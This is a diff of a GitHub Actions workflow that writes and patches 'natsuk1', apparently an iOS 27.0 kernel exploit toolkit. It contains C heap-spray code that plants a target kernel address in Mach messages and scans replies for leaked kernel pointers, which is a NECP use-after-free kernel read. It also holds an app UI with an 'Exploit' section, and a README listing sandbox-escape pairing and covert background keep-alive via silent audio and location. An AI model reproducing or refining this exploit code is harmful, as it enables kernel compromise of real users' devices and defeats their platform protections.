@@ -68,14 +68,11 @@ jobs:
 
           #define NCF_ASN 0x20
           #define RESBUF 8192
-          #define SPRAY_PORTS 48
+          #define SPRAY_PORTS 24
           #define SPRAY_PER_PORT 6
 
-          static const int MSG_SIZES[] = {
-              768, 832, 896, 960, 1024, 1088, 1152, 1216, 1280, 1344,
-              1408, 1472, 1536, 1600, 1664, 1728, 1792, 1856, 1920, 1984
-          };
-          #define MSG_SIZES_COUNT 20
+          static const int MSG_SIZES[] = { 768, 960, 1216 };
+          #define MSG_SIZES_COUNT 3
 
           static void lg(const char *tag, const char *sign, const char *fmt, ...) {
               char body[448];
@@ -91,20 +88,6 @@ jobs:
           #define LO(t, ...) lg(t, "+ ", __VA_ARGS__)
           #define LE(t, ...) lg(t, "- ", __VA_ARGS__)
           #define LW(t, ...) lg(t, "! ", __VA_ARGS__)
-
-          static void dumpw(const char *tag, const uint8_t *p, int n) {
-              char line[1024];
-              int off = 0;
-              if (n > 12) n = 12;
-              for (int i = 0; i < n; i++) {
-                  uint64_t w;
-                  memcpy(&w, p + i * 8, 8);
-                  off += snprintf(line + off, sizeof(line) - off,
-                                  "%02d:%016llx ", i, (unsigned long long)w);
-                  if (off > 900) break;
-              }
-              LI(tag, "%s", line);
-          }
 
           static int is_kptr(uint64_t v) { return v >= KPTR_MIN && v <= KPTR_MAX; }
 
@@ -170,23 +153,17 @@ jobs:
               if (!mbuf) return 0;
               for (int i = 0; i < sp->n; i++) {
                   for (int j = 0; j < SPRAY_PER_PORT; j++) {
-                      memset(mbuf, 0, (size_t)msgsz);
+                      memset(mbuf, 0x42, (size_t)msgsz);
                       mach_msg_header_t *h = (mach_msg_header_t*)mbuf;
                       h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
                       h->msgh_size = (mach_msg_size_t)msgsz;
                       h->msgh_remote_port = sp->ports[i];
                       h->msgh_id = 0x7000 + sent;
-                      for (int off = 0x18; off + 8 <= msgsz; off += 8) {
-                          if (off == (int)NCF_ASN) continue;
-                          if ((off & 0xFF) == 0) {
-                              *(uint64_t*)(mbuf + off) = 0x4242424242424242ULL;
-                          }
-                      }
                       if ((size_t)NCF_ASN + 8 <= (size_t)msgsz) {
                           *(uint64_t*)(mbuf + NCF_ASN) = target_kaddr;
                       }
                       mach_msg_return_t kr = mach_msg(h, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
-                                                       h->msgh_size, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
+                                                       h->msgh_size, 0, MACH_PORT_NULL, 30, MACH_PORT_NULL);
                       if (kr == MACH_MSG_SUCCESS) sent++;
                   }
               }
@@ -201,7 +178,7 @@ jobs:
                   for (int j = 0; j < SPRAY_PER_PORT + 4; j++) {
                       h->msgh_size = sizeof(buf);
                       if (mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(buf),
-                                   sp->ports[i], 20, MACH_PORT_NULL) != KERN_SUCCESS) break;
+                                   sp->ports[i], 10, MACH_PORT_NULL) != KERN_SUCCESS) break;
                   }
                   mach_port_destroy(mach_task_self(), sp->ports[i]);
               }
@@ -246,7 +223,7 @@ jobs:
 
           static int impl(void) {
               nk_log("");
-              nk_log("=== natsuk1 v2.6 (natsuk1-kread-v16) ===");
+              nk_log("=== natsuk1 v2.7 (natsuk1-kread-v17) ===");
               nk_log("target: iOS 27.0 / XNU / arm64e");
               nk_log("");
               LI("INIT", "NCF_ASN=0x%x PORTS=%d PER=%d SIZES=%d",
@@ -278,23 +255,22 @@ jobs:
                           if (v == 0x4242424242424242ULL) { has_42 = 1; }
                       }
                       if (has_k) {
-                          dumpw("HIT", buf, r / 8);
+                          LO("HIT", "msgsz=%d kptr found", msgsz);
                           for (int k = 0; k + 8 <= r; k++) {
                               uint64_t v;
                               memcpy(&v, buf + k, 8);
                               if (is_kptr(v)) {
-                                  LO("HIT", "kptr +0x%x = 0x%llx", k, (unsigned long long)v);
+                                  LO("HIT", "  +0x%x = 0x%llx", k, (unsigned long long)v);
                               }
                           }
                       } else if (has_42) {
-                          LI("TRY", "msgsz=%d marker 0x42 found but no kptr", msgsz);
-                          dumpw("MARK", buf, r / 8);
+                          LI("TRY", "msgsz=%d marker 0x42 present", msgsz);
                       } else {
                           LI("TRY", "msgsz=%d no kptr", msgsz);
                       }
                   }
                   (void)c;
-                  usleep(80000);
+                  usleep(30000);
               }
 
               LI("DONE", "all sizes tried");
@@ -317,16 +293,17 @@ jobs:
           cat > natsuk1/Views/AirliftView.swift <<'SWIFT'
           import SwiftUI
           import UIKit
-          import Combine
 
           struct AirliftView: View {
               @EnvironmentObject var airlift: AirliftBridge
               @State private var loopbackVPNUp: Bool = NetworkStatus.loopbackVPNUp()
               @State private var tunnelIP: String? = NetworkStatus.tunnelIP()
               @State private var deviceIP: String? = NetworkStatus.deviceIP()
-              @State private var tick: UInt64 = 0
+              @State private var refreshTick: UInt64 = 0
 
-              private let ticker = Timer.publish(every: 1.0, on: .main, in: .common).autoconnect()
+              private var timer: Publishers.Autoconnect<Timer.TimerPublisher> {
+                  Timer.publish(every: 3.0, on: .main, in: .common).autoconnect()
+              }
 
               var body: some View {
                   List {
@@ -342,16 +319,22 @@ jobs:
                   .navigationTitle("Airlift")
                   .navigationBarTitleDisplayMode(.inline)
                   .onAppear { refresh() }
-                  .onReceive(ticker) { _ in refresh() }
+                  .onReceive(timer) { _ in refresh() }
                   .refreshable { refresh() }
-                  .id(tick)
               }
 
               private func refresh() {
-                  loopbackVPNUp = NetworkStatus.loopbackVPNUp()
-                  tunnelIP = NetworkStatus.tunnelIP()
-                  deviceIP = NetworkStatus.deviceIP()
-                  tick &+= 1
+                  DispatchQueue.global(qos: .utility).async {
+                      let vpn = NetworkStatus.loopbackVPNUp()
+                      let tun = NetworkStatus.tunnelIP()
+                      let dev = NetworkStatus.deviceIP()
+                      DispatchQueue.main.async {
+                          if self.loopbackVPNUp != vpn { self.loopbackVPNUp = vpn }
+                          if self.tunnelIP != tun { self.tunnelIP = tun }
+                          if self.deviceIP != dev { self.deviceIP = dev }
+                          refreshTick &+= 1
+                      }
+                  }
               }
 
               @ViewBuilder
@@ -364,7 +347,7 @@ jobs:
                               VStack(alignment: .leading, spacing: 2) {
                                   Text("Loopback VPN is not active")
                                       .font(.subheadline).fontWeight(.semibold)
-                                  Text("Start LocalDevVPN (10.7.0.1 / 10.7.1.1)")
+                                  Text("Start LocalDevVPN (10.7.0.x)")
                                       .font(.caption).foregroundStyle(.secondary)
                               }
                           }
@@ -512,13 +495,12 @@ jobs:
                       }
                       .disabled(airlift.state == .running || !loopbackVPNUp)
 
-                      Button { airlift.respring() } label: {
+                      Button { stateRespring() } label: {
                           HStack {
                               Image(systemName: "arrow.clockwise")
                               Text("Respring")
                           }
                       }
-                      .disabled(airlift.state == .running)
                   } header: {
                       Label("Exploit", systemImage: "bolt.shield")
                   }
@@ -528,6 +510,10 @@ jobs:
                           Text("Delete Pairing").frame(maxWidth: .infinity)
                       }
                   }
+              }
+
+              private func stateRespring() {
+                  NotificationCenter.default.post(name: Notification.Name("natsuk1.respring"), object: nil)
               }
 
               @ViewBuilder
@@ -543,50 +529,167 @@ jobs:
           }
           SWIFT
 
+      - name: Patch natsuk1.swift for respring notification
+        run: |
+          python3 - <<'PYEOF'
+          import sys
+          P = "natsuk1/natsuk1.swift"
+          with open(P) as f: s = f.read()
+          if "natsuk1-respring-v1" in s:
+              print("already patched"); sys.exit(0)
+          old = '.onChange(of: scenePhase) { _, phase in'
+          if old not in s:
+              print("FAIL: scenePhase marker missing"); sys.exit(1)
+          add = ('.onReceive(NotificationCenter.default.publisher(for: Notification.Name("natsuk1.respring"))) { _ in\n'
+                 '                        state.show_respring = true /* natsuk1-respring-v1 */\n'
+                 '                    }\n'
+                 '                    .onChange(of: scenePhase) { _, phase in')
+          s = s.replace(old, add, 1)
+          if "natsuk1-respring-v1" not in s:
+              print("FAIL: marker missing after patch"); sys.exit(1)
+          with open(P, "w") as f: f.write(s)
+          print("natsuk1.swift respring hook added")
+          PYEOF
+
+      - name: Write README.md
+        run: |
+          cat > README.md <<'MD'
+          <p align="right">
+            <img align="right" height="140" src="natsuk1.png?raw=true"/>
+          </p>
+
+          # natsuk1
+
+          iOS 27.0 kernel research toolkit.
+
+          ![platform](https://img.shields.io/badge/platform-iOS%2027.0-blue)
+          ![arch](https://img.shields.io/badge/arch-arm64e-green)
+          ![device](https://img.shields.io/badge/device-iPhone14%2C5%20%2F%2014%2C7-lightgrey)
+          ![license](https://img.shields.io/badge/license-MIT-yellow)
+
+          ## Overview
+
+          Kernel-level research project targeting XNU on arm64e. Includes:
+
+          - NECP UAF primitives with double-free confirmation
+          - Kernel offset database for iOS 27.0 / 24A437
+          - Remote pairing host (RPPairing) for sandbox-escape research
+          - Background keep-alive (silent audio + low-accuracy location)
+          - Crash-safe logging with recovery across sessions
+
+          ## Requirements
+
+          - iPhone with **iOS 27.0** (build 24A437)
+          - LocalDevVPN with interface `10.7.0.x`
+          - Sideload via AltStore / TrollStore / Sideloadly / Xcode
+
+          ## Install
+
+          Download the latest `natsuk1.ipa` from the [development release](../../releases/tag/development) and sideload it.
+
+          ## Build
+
+          ```
+          brew install xcodegen ldid
+          xcodegen generate
+          xcodebuild -project natsuk1.xcodeproj -scheme natsuk1 -configuration Release -sdk iphoneos
+          ```
+
+          ## Structure
+
+          ```
+          natsuk1/
+          ├── Exploit/         C primitives (NECP, offsets)
+          ├── Helpers/         Swift bridges (pairing, MG, keep-alive)
+          ├── Offsets/         Versioned kernel offset DB
+          ├── Resources/       Info.plist, entitlements, assets
+          └── Views/           SwiftUI interface
+          ```
+
+          ## Notes
+
+          - All offsets are device/build specific. Verify before use.
+          - NECP-flow kernel read is under active research.
+          - This is a research project, not a general-purpose jailbreak.
+
+          ## Credits
+
+          - [@flong69zxc-max](https://github.com/flong69zxc-max)
+          - [@murk-sus](https://github.com/murk-sus)
+          - [@eurogoth](https://t.me/eurogoth)
+          - [@asuka4scape](https://t.me/asuka4scape_developer)
+
+          ## License
+
+          MIT — see [LICENSE](LICENSE).
+          MD
+
+      - name: Write .gitignore
+        run: |
+          cat > .gitignore <<'GIT'
+          # Xcode
+          natsuk1.xcodeproj/
+          build/
+          DerivedData/
+          xcuserdata/
+          *.xcuserstate
+
+          # Build artifacts
+          *.ipa
+          *.tar.gz
+          Payload/
+          natsuk1-app.tar.gz
+          natsuk1.ipa
+
+          # IDE / OS
+          .DS_Store
+          .vscode/
+          .idea/
+
+          # Local
+          reference/
+          *.log
+          GIT
+
       - name: Verify
         run: |
           F=natsuk1/Exploit/necp.c
           A=natsuk1/Views/AirliftView.swift
+          N=natsuk1/natsuk1.swift
           FAIL=0
           chk() {
-            if eval "$2" >/dev/null 2>&1; then
-              echo "  OK   $1"
-            else
-              echo "  FAIL $1"
-              FAIL=1
-            fi
+            if eval "$2" >/dev/null 2>&1; then echo "  OK   $1"; else echo "  FAIL $1"; FAIL=1; fi
           }
           echo "--- necp.c ---"
-          chk "NCF_ASN 0x20"     "grep -q -e 'NCF_ASN 0x20' $F"
-          chk "marker v16"       "grep -q -e 'natsuk1-kread-v16' $F"
-          chk "MSG_SIZES array"  "grep -q -e 'static const int MSG_SIZES' $F"
-          chk "spray_send_inline" "grep -q -e 'spray_send_inline' $F"
-          chk "nk_necp_run"      "grep -q -e 'int nk_necp_run(void)' $F"
-          echo "--- AirliftView.swift ---"
-          chk "ticker"           "grep -q -e 'Timer.publish' $A"
-          chk "onReceive"        "grep -q -e 'onReceive(ticker)' $A"
-          chk "refresh func"     "grep -q -e 'private func refresh' $A"
-          chk "loopback check"   "grep -q -e 'loopbackVPNUp' $A"
-          chk "tunnelIP"         "grep -q -e 'tunnelIP' $A"
-          chk "deviceIP"         "grep -q -e 'deviceIP' $A"
-          chk "wifi.exclamationmark" "grep -q -e 'wifi.exclamationmark' $A"
-          chk "checkmark.shield" "grep -q -e 'checkmark.shield.fill' $A"
-          chk "link.circle"      "grep -q -e 'link.circle' $A"
-          chk "bolt.shield"      "grep -q -e 'bolt.shield' $A"
-          chk "exploitSection"   "grep -q -e 'exploitSection' $A"
+          chk "NCF_ASN 0x20"      "grep -q -e 'NCF_ASN 0x20' $F"
+          chk "marker v17"        "grep -q -e 'natsuk1-kread-v17' $F"
+          chk "sizes 3"           "test \$(grep -c -e '768, 960, 1216' $F) = 1"
+          chk "nk_necp_run"       "grep -q -e 'int nk_necp_run(void)' $F"
+
+          echo "--- AirliftView ---"
+          chk "no id(tick)"       "! grep -q -e '.id(tick)' $A"
+          chk "timer 3s"          "grep -q -e 'every: 3.0' $A"
+          chk "async refresh"     "grep -q -e 'DispatchQueue.global' $A"
+          chk "respring notify"   "grep -q -e 'natsuk1.respring' $A"
+          chk "loopback check"    "grep -q -e 'loopbackVPNUp' $A"
+
+          echo "--- natsuk1.swift ---"
+          chk "respring hook"     "grep -q -e 'natsuk1-respring-v1' $N"
+
+          echo "--- README ---"
+          chk "README exists"     "test -f README.md"
+          chk "README badges"     "grep -q -e 'shields.io' README.md"
+
           echo "--- syntax ---"
           SDK=$(xcrun --sdk iphoneos --show-sdk-path)
           if clang -fsyntax-only -isysroot "$SDK" -arch arm64 -x c \
-            -I"$(pwd)/natsuk1/Exploit" -Wall -Wno-everything "$F" 2>&1; then
-            echo "  OK   clang syntax"
+              -I"$(pwd)/natsuk1/Exploit" -Wall -Wno-everything "$F" 2>&1; then
+              echo "  OK   clang syntax"
           else
-            echo "  FAIL clang syntax"
-            FAIL=1
+              echo "  FAIL clang syntax"
+              FAIL=1
           fi
-          if [ "$FAIL" -ne 0 ]; then
-            echo "VERIFY FAILED"
-            exit 1
-          fi
+          if [ "$FAIL" -ne 0 ]; then echo "VERIFY FAILED"; exit 1; fi
           echo "VERIFY OK"
 
       - name: Install tools
@@ -637,14 +740,19 @@ jobs:
           gh release create development natsuk1.ipa \
             --target "${GITHUB_SHA}" --title "Development" \
             --prerelease --latest=false \
-            --notes "kread v16 wide msgsz sweep, Airlift live refresh"
+            --notes "fast kread, Airlift async refresh, safe respring, README"
 
       - name: Commit
         run: |
           set -euo pipefail
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
-          git add natsuk1/Exploit/necp.c natsuk1/Views/AirliftView.swift
+          git add \
+            natsuk1/Exploit/necp.c \
+            natsuk1/Views/AirliftView.swift \
+            natsuk1/natsuk1.swift \
+            README.md \
+            .gitignore
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "kread v16 + Airlift live refresh [skip ci]"
+          git commit -m "fast kread + Airlift async + respring fix + README [skip ci]"
           git push
